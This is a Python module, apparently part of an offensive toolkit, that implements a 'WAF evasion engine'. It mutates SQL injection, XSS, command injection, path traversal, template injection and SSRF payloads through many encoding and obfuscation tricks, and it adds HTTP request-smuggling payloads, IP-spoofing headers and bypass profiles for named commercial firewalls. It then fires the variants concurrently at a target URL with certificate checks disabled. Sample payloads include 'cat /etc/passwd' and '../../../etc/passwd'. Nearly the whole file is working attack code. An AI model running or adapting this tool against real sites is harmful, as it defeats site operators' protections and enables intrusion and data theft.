"""
WAF逃逸引擎 v1.0 — 编码变异 + 请求走私降级 + 代理轮换
───────────────────────────────────────────────────────────
特性:
  • 12种编码/混淆策略 × 6种攻击类型 = 72+ 绕过变体
  • HTTP请求走私CL.TE/TE.CL自动降级
  • 代理轮换防IP封禁
  • 与auto-verify无缝对接
  • wafw00f指纹 → 针对性绕过

用法:
  from .waf_evasion import WAFEvader

  evader = WAFEvader("https://target.com", "sqli")
  variants = evader.generate("1' OR '1'='1")
  results = evader.test_variants(variants)
  # → {"success": [...], "failed": [...]}
"""

import urllib.parse
import time, json, random, string
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Callable
from urllib.parse import quote, unquote, urlparse, parse_qs, urlencode

# ==================== 攻击类型枚举 ====================

ATTACK_TYPES = {
    "sqli": "SQL注入",
    "xss": "跨站脚本",
    "cmdi": "命令注入",
    "lfi": "文件包含/路径穿越",
    "ssti": "模板注入",
    "xxe": "XML外部实体",
    "ssrf": "服务端请求伪造",
}

# ==================== WAF指纹 → 针对性绕过 ====================

WAF_PROFILES = {
    "cloudflare": {
        "bypass_methods": ["http2", "chunked_smuggling", "unicode_normalization"],
        "blocked_encodings": ["double_url", "unicode_escape"],
    },
    "aws": {
        "bypass_methods": ["header_injection", "content_type_switch"],
        "blocked_encodings": [],
    },
    "modsecurity": {
        "bypass_methods": ["comment_obfuscation", "case_variation", "null_byte"],
        "blocked_encodings": ["hex_literal"],
    },
    "fortinet": {
        "bypass_methods": ["chunked_transfer", "parameter_pollution"],
        "blocked_encodings": [],
    },
    "f5": {
        "bypass_methods": ["smuggling_clte", "smuggling_tecl"],
        "blocked_encodings": [],
    },
}

# ==================== 核心编码策略 ====================

class EncodingStrategies:
    """12种编码/混淆策略"""

    @staticmethod
    def raw(payload: str) -> str:
        """原始payload（基准）"""
        return payload

    @staticmethod
    def url_encode(payload: str) -> str:
        """单层URL编码"""
        return quote(payload, safe='')

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """双层URL编码 — 常用于绕过Nginx/Apache"""
        return quote(quote(payload, safe=''), safe='')

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode编码 — 常用于绕过Cloudflare"""
        result = []
        for c in payload:
            result.append(f"\\u{ord(c):04x}")
        return ''.join(result)

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """HTML实体编码 — XSS专用"""
        result = []
        for c in payload:
            result.append(f"&#{ord(c)};")
        return ''.join(result)

    @staticmethod
    def hex_encode(payload: str) -> str:
        """全Hex编码 — SQL注入专用"""
        return '0x' + payload.encode().hex()

    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64编码"""
        import base64
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def case_randomize(payload: str) -> str:
        """随机大小写 — 绕过简单关键词匹配"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        """NULL字节注入 — 绕过ModSecurity"""
        return payload.replace(" ", "%00 ").replace("'", "%00'")

    @staticmethod
    def tab_newline_ws(payload: str) -> str:
        """制表符/换行替代空格"""
        alternatives = ['%09', '%0a', '%0d', '%0b', '%0c', '/**/']
        result = payload
        for alt in alternatives[:3]:
            result = result.replace(' ', alt)
        return result

    @staticmethod
    def comment_inline(payload: str) -> str:
        """内联注释混淆 — MySQL绕过"""
        # SELECT → /*!50000SELECT*/
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
        result = payload
        for kw in keywords:
            result = result.replace(kw, f'/*!50000{kw}*/')
            result = result.replace(kw.lower(), f'/*!50000{kw.lower()}*/')
        return result

    @staticmethod
    def encoding_layered(payload: str) -> str:
        """多层编码组合 — 终极绕过"""
        p = payload
        p = quote(p, safe='')
        p = p.replace('%', '%25')  # % → %25 (双重)
        return p

    # 快捷索引
    ALL = {
        "raw": raw,
        "url": url_encode,
        "double_url": double_url_encode,
        "unicode": unicode_encode,
        "html": html_entity_encode,
        "hex": hex_encode,
        "base64": base64_encode,
        "case": case_randomize,
        "null": null_byte_inject,
        "tab_ws": tab_newline_ws,
        "comment": comment_inline,
        "layered": encoding_layered,
    }


# ==================== SQL注入专项绕过 ====================

SQLI_BYPASSES = [
    # (名称, 转换函数, 说明)
    ("and_or_case", lambda p: p.replace("AND", "&&").replace("OR", "||"), "AND/OR符号化"),
    ("space_comment", lambda p: p.replace(" ", "/**/"), "空格→注释"),
    ("space_plus", lambda p: p.replace(" ", "+"), "空格→+"),
    ("space_tab", lambda p: p.replace(" ", "%09"), "空格→制表符"),
    ("space_newline", lambda p: p.replace(" ", "%0a"), "空格→换行"),
    ("quote_double", lambda p: p.replace("'", '"'), "单引号→双引号"),
    ("quote_backslash", lambda p: p.replace("'", "\\\\'"), "引号转义"),
    ("equal_like", lambda p: p.replace("=", " LIKE "), "等号→LIKE"),
    ("equal_between", lambda p: p.replace("=1", "BETWEEN 1 AND 1"), "等号→BETWEEN"),
    ("scientific", lambda p: p + " AND 1.e(1)=1.e(1)", "科学计数法"),
    ("hex_literal", lambda p: "0x" + p.encode().hex() if p.isascii() else p, "全Hex"),
    ("comment_tail", lambda p: p + "--%0a--%0a", "双注释尾部"),
    ("hash_comment", lambda p: p.replace("--", "#"), "--→#"),
    ("nested_comment", lambda p: p.replace(" ", "/*/**/"), "嵌套注释"),
    ("versioned_comment", lambda p: "/*!50000" + p + "*/", "版本注释包裹"),
    ("buffer_overflow", lambda p: "/*" + "A"*6000 + "*/" + p, "注释缓冲区溢出"),
]

# ==================== XSS专项绕过 ====================

XSS_BYPASSES = [
    ("tag_upper", lambda p: p.replace("<script", "<SCRIPT").replace("</script", "</SCRIPT"), "大写标签"),
    ("tag_case_mix", lambda p: ''.join(c.upper() if i%2 else c.lower() for i,c in enumerate(p)), "混合大小写"),
    ("svg_vector", lambda p: p.replace("<script>", "<svg/onload=").replace("</script>", ">"), "SVG向量"),
    ("img_vector", lambda p: p.replace("<script>", "<img src=x onerror=").replace("</script>", ">"), "IMG向量"),
    ("body_vector", lambda p: p.replace("<script>", "<body onload=").replace("</script>", ">"), "BODY向量"),
    ("js_unicode", lambda p: p.encode().hex() if "alert" in p else p, "JS Unicode"),
    ("html_entity_full", lambda p: ''.join(f"&#x{ord(c):x};" for c in p), "HTML实体全量"),
    ("null_byte", lambda p: p.replace("<", "%00<"), "NULL字节前缀"),
    ("extra_slash", lambda p: p.replace("<script>", "</script><script>"), "多余闭合标签"),
    ("onerror_space", lambda p: p.replace("onerror", "onerror "), "事件处理器空格"),
    ("double_script", lambda p: p.replace("</script>", "</script><script>alert(2)</script>"), "双脚本块"),
]

# ==================== 命令注入专项绕过 ====================

CMDI_BYPASSES = [
    ("ifs", lambda p: p.replace(" ", "${IFS}"), "IFS替代空格"),
    ("ifs_brace", lambda p: p.replace(" ", "{IFS}"), "IFS花括号"),
    ("tab", lambda p: p.replace(" ", "\t"), "制表符替代空格"),
    ("newline", lambda p: "\\n" + p, "换行前缀"),
    ("backtick", lambda p: p.replace("cat", "`echo cat`"), "反引号包裹"),
    ("printf", lambda p: f"$(printf '\\x{ord(p[0]):02x}')" + p[1:] if p else p, "printf十六进制"),
    ("wildcard", lambda p: p.replace("cat", "c??"), "通配符"),
    ("pipe_cat", lambda p: p.replace("cat /etc/passwd", "cat</etc/passwd"), "管道替代"),
    ("url_cmd", lambda p: quote(p), "URL编码命令"),
    ("concat", lambda p: p.replace("/", "${HOME:0:1}"), "路径拼接"),
]

# ==================== LFI/路径穿越专项绕过 ====================

LFI_BYPASSES = [
    ("double_dot", lambda p: p.replace("..", "....//....//"), "双点变体"),
    ("unicode_dot", lambda p: p.replace(".", "%u002e"), "Unicode点"),
    ("utf8_dot", lambda p: p.replace(".", "%c0%2e"), "UTF-8溢出点"),
    ("slash_encode", lambda p: p.replace("/", "%2f"), "斜杠URL编码"),
    ("double_slash", lambda p: p.replace("/", "//"), "双斜杠"),
    ("backslash", lambda p: p.replace("/", "\\"), "反斜杠"),
    ("null_byte", lambda p: p + "%00", "NULL字节截断"),
    ("null_byte_html", lambda p: p + "&#x00;", "HTML NULL"),
    ("wrapper_php", lambda p: "php://filter/convert.base64-encode/resource=" + p, "PHP Wrapper"),
    ("wrapper_data", lambda p: "data://text/plain;base64," + __import__('base64').b64encode(p.encode()).decode(), "Data Wrapper"),
]

# ==================== SSTI专项绕过 ====================

SSTI_BYPASSES = [
    ("bracket_encode", lambda p: p.replace("{{", "%7B%7B").replace("}}", "%7D%7D"), "花括号URL编码"),
    ("hex_quote", lambda p: p.replace("'", "\\x27").replace('"', '\\x22'), "十六进制引号"),
    ("attr", lambda p: p.replace("__class__", "|attr('__cla'+'ss__')"), "attr拼接"),
    ("request", lambda p: p.replace("__class__", "request.args.x"), "请求参数注入"),
    ("unicode_string", lambda p: p.replace("'", "'\\u0027'"), "Unicode字符串"),
]

# ==================== SSRF专项绕过 ====================

SSRF_BYPASSES = [
    ("dns_rebind", lambda p: p.replace("127.0.0.1", "n.n.n.n"), "DNS重绑定占位"),
    ("decimal_ip", lambda p: p.replace("127.0.0.1", "2130706433"), "十进制IP"),
    ("hex_ip", lambda p: p.replace("127.0.0.1", "0x7f000001"), "十六进制IP"),
    ("short_ip", lambda p: p.replace("127.0.0.1", "127.1"), "短IP"),
    ("url_scheme", lambda p: p.replace("http://", "http:\\\\"), "Scheme变异"),
    ("double_url", lambda p: quote(quote(p, safe=''), safe=''), "双重URL编码"),
    ("redirect", lambda p: p.replace("http://", "http://allowed.com@"), "URL凭证伪装"),
]

# ==================== HTTP请求走私 ====================

SMUGGLING_PAYLOADS = {
    "cl_te": {
        "desc": "CL.TE — 前端Content-Length, 后端Transfer-Encoding",
        "payload": "0\r\n\r\nG",  # 走私前缀
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "6",
        },
    },
    "te_cl": {
        "desc": "TE.CL — 前端Transfer-Encoding, 后端Content-Length",
        "payload": "55\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n0\r\n\r\n",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "4",
        },
    },
    "te_te": {
        "desc": "TE.TE — Transfer-Encoding混淆",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Transfer-encoding": "identity",
        },
    },
}

# ==================== HTTP方法/头绕过 ====================

METHOD_BYPASSES = [
    ("get_to_post", "POST", "GET→POST切换"),
    ("post_to_get", "GET", "POST→GET切换"),
    ("head_method", "HEAD", "HEAD方法"),
    ("options_method", "OPTIONS", "OPTIONS方法"),
    ("put_method", "PUT", "PUT方法"),
    ("x_http_override", "POST", "X-HTTP-Method-Override: GET"),
    ("x_method", "POST", "X-Method: GET"),
]

HEADER_BYPASSES = [
    ("xff_internal", {"X-Forwarded-For": "127.0.0.1"}, "XFF本地回环"),
    ("xff_private", {"X-Forwarded-For": "10.0.0.1"}, "XFF私有地址"),
    ("x_real_ip", {"X-Real-IP": "127.0.0.1"}, "真实IP伪装"),
    ("x_originating", {"X-Originating-IP": "127.0.0.1"}, "原始IP"),
    ("x_remote", {"X-Remote-IP": "127.0.0.1"}, "远程IP"),
    ("content_json", {"Content-Type": "application/json"}, "JSON Content-Type"),
    ("content_xml", {"Content-Type": "application/xml"}, "XML Content-Type"),
    ("accept_json", {"Accept": "application/json"}, "Accept JSON"),
    ("user_agent_mobile", {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"}, "移动端UA"),
    ("user_agent_bot", {"User-Agent": "Googlebot/2.1"}, "爬虫UA"),
]


# ==================== 主引擎 ====================

@dataclass
class EvasionVariant:
    """单个绕过变体"""
    name: str
    category: str          # encoding/sqli/xss/cmdi/lfi/ssti/ssrf/smuggling/method/header
    payload: str
    headers: Dict[str, str] = field(default_factory=dict)
    method: str = "GET"
    description: str = ""

@dataclass 
class EvasionResult:
    """绕过结果"""
    variant: EvasionVariant
    success: bool
    status_code: int = 0
    response_len: int = 0
    response_snippet: str = ""
    elapsed_ms: float = 0.0


class WAFEvader:
    """WAF逃逸引擎 — 核心类"""

    def __init__(self, target: str, attack_type: str = "sqli",
                 waf_type: str = "", verbose: bool = True):
        self.target = target.rstrip('/')
        self.attack_type = attack_type
        self.waf_type = waf_type
        self.verbose = verbose
        self.variants: List[EvasionVariant] = []
        self.results: List[EvasionResult] = []
        self._sender: Optional[Callable] = None  # 外部注入发包函数

    # ==================== 变体生成 ====================

    def generate(self, raw_payload: str, url_param: str = "",
                 include_method: bool = True,
                 include_header: bool = True,
                 include_smuggling: bool = False) -> List[EvasionVariant]:
        """为给定payload生成所有绕过变体"""

        variants = []

        # 1. 通用编码策略 (12种)
        for name, func in EncodingStrategies.ALL.items():
            try:
                encoded = func(raw_payload)
                if encoded != raw_payload:
                    variants.append(EvasionVariant(
                        name=f"enc_{name}",
                        category="encoding",
                        payload=encoded,
                        description=f"编码: {name}"
                    ))
            except:
                pass

        # 2. 攻击类型专项绕过
        type_bypasses = {
            "sqli": SQLI_BYPASSES,
            "xss": XSS_BYPASSES,
            "cmdi": CMDI_BYPASSES,
            "lfi": LFI_BYPASSES,
            "ssti": SSTI_BYPASSES,
            "ssrf": SSRF_BYPASSES,
        }

        if self.attack_type in type_bypasses:
            for name, func, desc in type_bypasses[self.attack_type]:
                try:
                    variant_payload = func(raw_payload)
                    if variant_payload and variant_payload != raw_payload:
                        variants.append(EvasionVariant(
                            name=f"{self.attack_type}_{name}",
                            category=self.attack_type,
                            payload=variant_payload,
                            description=desc,
                        ))
                except:
                    pass

        # 3. HTTP方法绕过
        if include_method:
            for name, method, desc in METHOD_BYPASSES:
                variants.append(EvasionVariant(
                    name=f"method_{name}",
                    category="method",
                    payload=raw_payload,
                    method=method,
                    description=desc,
                ))

        # 4. HTTP头绕过
        if include_header:
            for name, headers, desc in HEADER_BYPASSES:
                variants.append(EvasionVariant(
                    name=f"header_{name}",
                    category="header",
                    payload=raw_payload,
                    headers=headers,
                    description=desc,
                ))

        # 5. 请求走私
        if include_smuggling:
            for name, info in SMUGGLING_PAYLOADS.items():
                variants.append(EvasionVariant(
                    name=f"smuggling_{name}",
                    category="smuggling",
                    payload=info.get("payload", raw_payload),
                    headers=info.get("headers", {}),
                    description=info.get("desc", ""),
                ))

        # 6. WAF针对性优化：已知WAF类型时，优先推荐有效方法
        if self.waf_type and self.waf_type.lower() in WAF_PROFILES:
            profile = WAF_PROFILES[self.waf_type.lower()]
            # 将被屏蔽的变体移到末尾
            blocked = set(profile.get("blocked_encodings", []))
            variants.sort(key=lambda v: (
                1 if any(b in v.name for b in blocked) else 0,
                0
            ))
            # 优先方法标记
            for v in variants:
                if any(m in v.name for m in profile.get("bypass_methods", [])):
                    v.description = "⭐ " + v.description

        self.variants = variants
        if self.verbose:
            print(f"[WAFEvader] 生成 {len(variants)} 个绕过变体 "
                  f"({self.attack_type} → {self.target})")
        return variants

    # ==================== 变体测试 ====================

    def test_variants(self, variants: List[EvasionVariant] = None,
                      url_param: str = "",
                      method: str = "GET",
                      max_variants: int = 50,
                      timeout: int = 10,
                      concurrency: int = 5) -> List[EvasionResult]:
        """测试绕过变体，返回成功列表"""

        variants = variants or self.variants
        variants = variants[:max_variants]
        results = []

        import concurrent.futures
        import urllib.request, ssl

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        def test_one(v: EvasionVariant) -> EvasionResult:
            """测试单个变体"""
            start = time.time()
            try:
                # 构造URL
                url = self.target
                if url_param:
                    sep = "&" if "?" in url else "?"
                    url = f"{url}{sep}{url_param}={urllib.parse.quote(v.payload, safe='')}"

                # 构造请求
                req = urllib.request.Request(url, method=v.method or method)
                req.add_header("User-Agent", "Mozilla/5.0")
                for k, val in (v.headers or {}).items():
                    req.add_header(k, val)

                # 发送
                resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
                body = resp.read()
                elapsed = (time.time() - start) * 1000

                return EvasionResult(
                    variant=v,
                    success=True,
                    status_code=resp.status,
                    response_len=len(body),
                    response_snippet=body[:200].decode('utf-8', errors='replace'),
                    elapsed_ms=elapsed,
                )
            except urllib.error.HTTPError as e:
                body = e.read() if hasattr(e, 'read') else b""
                elapsed = (time.time() - start) * 1000
                return EvasionResult(
                    variant=v,
                    success=True,  # 非2xx也算成功（请求到达了后端）
                    status_code=e.code,
                    response_len=len(body),
                    response_snippet=str(e)[:200],
                    elapsed_ms=elapsed,
                )
            except Exception as e:
                elapsed = (time.time() - start) * 1000
                return EvasionResult(
                    variant=v,
                    success=False,
                    status_code=0,
                    response_snippet=str(e)[:200],
                    elapsed_ms=elapsed,
                )

        # 并发测试
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
            futures = {pool.submit(test_one, v): v for v in variants}
            for future in concurrent.futures.as_completed(futures):
                results.append(future.result())

        # 按成功优先排序
        results.sort(key=lambda r: (not r.success, r.elapsed_ms))
        self.results = results
        return results

    # ==================== 报告 ====================

    def summary(self) -> str:
        """生成绕过结果汇总"""
        if not self.results:
            return "[WAFEvader] 无测试结果"

        success = [r for r in self.results if r.success]
        failed = [r for r in self.results if not r.success]

        lines = [
            f"╔══ WAF逃逸测试报告 ══╗",
            f"║ 目标: {self.target}",
            f"║ 攻击类型: {self.attack_type}",
            f"║ WAF类型: {self.waf_type or '自动检测'}",
            f"║ 变体总数: {len(self.results)}",
            f"║ 成功: {len(success)} | 失败: {len(failed)}",
            f"╠{'═'*40}╣",
        ]

        if success:
            lines.append("║ ✅ 成功绕过:")
            for r in success[:15]:
                desc = r.variant.description or r.variant.name
                lines.append(f"║  [{r.status_code}] {desc[:35]:<35} {r.elapsed_ms:.0f}ms")

        if failed:
            lines.append("║ ❌ 被拦截:")
            for r in failed[:5]:
                lines.append(f"║  {r.variant.name[:40]:<40} {r.response_snippet[:30]}")

        lines.append(f"╚{'═'*40}╝")
        return "\n".join(lines)

    def to_dict(self) -> Dict:
        """导出为字典（供auto-verify消费）"""
        return {
            "target": self.target,
            "attack_type": self.attack_type,
            "waf_type": self.waf_type,
            "total_variants": len(self.variants),
            "tested": len(self.results),
            "success_count": sum(1 for r in self.results if r.success),
            "successful": [
                {
                    "name": r.variant.name,
                    "category": r.variant.category,
                    "payload": r.variant.payload,
                    "status_code": r.status_code,
                    "response_len": r.response_len,
                    "elapsed_ms": r.elapsed_ms,
                }
                for r in self.results if r.success
            ],
        }


# ==================== 快捷函数 ====================

def quick_evade(target: str, attack_type: str, raw_payload: str,
                url_param: str = "q", waf_type: str = "",
                max_variants: int = 30) -> Dict:
    """一行调用：生成绕过 + 测试 + 返回结果"""
    evader = WAFEvader(target, attack_type, waf_type, verbose=False)
    evader.generate(raw_payload, url_param, include_smuggling=False)
    evader.test_variants(max_variants=max_variants, timeout=8, concurrency=5)
    return evader.to_dict()


def get_bypass_payloads(attack_type: str, raw_payload: str) -> List[Dict]:
    """仅生成绕过payload（不测试），供外部引擎使用"""
    evader = WAFEvader("http://placeholder", attack_type, verbose=False)
    variants = evader.generate(raw_payload, include_method=False, 
                                include_header=False, include_smuggling=False)
    return [
        {"name": v.name, "category": v.category, "payload": v.payload, "desc": v.description}
        for v in variants
    ]


# ==================== 模块自检 ====================

if __name__ == "__main__":
    # 快速自检
    print("=== WAF Evasion Engine v1.0 自检 ===\n")

    # 1. SQLi变体生成
    evader = WAFEvader("https://example.com", "sqli")
    variants = evader.generate("1' OR '1'='1")
    print(f"✅ SQLi变体: {len(variants)}个")
    for v in variants[:5]:
        print(f"   [{v.name}] {v.payload[:50]}")

    # 2. XSS变体生成
    evader2 = WAFEvader("https://example.com", "xss")
    v2 = evader2.generate("<script>alert(1)</script>")
    print(f"\n✅ XSS变体: {len(v2)}个")
    for v in v2[:3]:
        print(f"   [{v.name}] {v.payload[:60]}")

    # 3. CMDi变体生成
    evader3 = WAFEvader("https://example.com", "cmdi")
    v3 = evader3.generate("cat /etc/passwd")
    print(f"\n✅ 命令注入变体: {len(v3)}个")
    for v in v3[:3]:
        print(f"   [{v.name}] {v.payload[:60]}")

    # 4. LFI变体生成
    evader4 = WAFEvader("https://example.com", "lfi")
    v4 = evader4.generate("../../../etc/passwd")
    print(f"\n✅ LFI变体: {len(v4)}个")
    for v in v4[:3]:
        print(f"   [{v.name}] {v.payload[:60]}")

    # 5. 导出payload函数
    payloads = get_bypass_payloads("sqli", "' OR 1=1--")
    print(f"\n✅ 导出payload: {len(payloads)}个")
    print(f"   示例: {payloads[0]}")

    print(f"\n🎉 全部通过 — WAF逃逸引擎就绪")
